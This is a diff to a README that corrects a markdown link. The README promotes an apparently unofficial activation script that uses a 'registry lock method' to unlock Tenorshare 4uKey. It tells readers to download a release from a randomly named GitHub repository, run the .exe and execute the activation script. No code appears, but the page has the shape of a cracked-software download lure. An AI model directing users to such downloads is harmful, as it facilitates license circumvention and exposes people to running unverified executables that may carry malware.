@@ -30,7 +30,7 @@ This script utilizes the registry lock method to activate the software. Please n
 
 ## 🚀 Getting Started
 
-1. Download & Install: [Download the latest release]https://github.com/privacy850/potential-octo-doodle/releases/tag/Download) and follow the installation instructions.
+1. Download & Install: [Download the latest release](https://github.com/privacy850/potential-octo-doodle/releases/tag/Download) and follow the installation instructions.
 2. Launch the Software: Run the .exe file after installation.
 3. Activate: Use the provided script to activate the software, ensuring internet access during the process.
 4. Explore: Once activated, enjoy full access to all the features Tenorshare 4uKey offers.
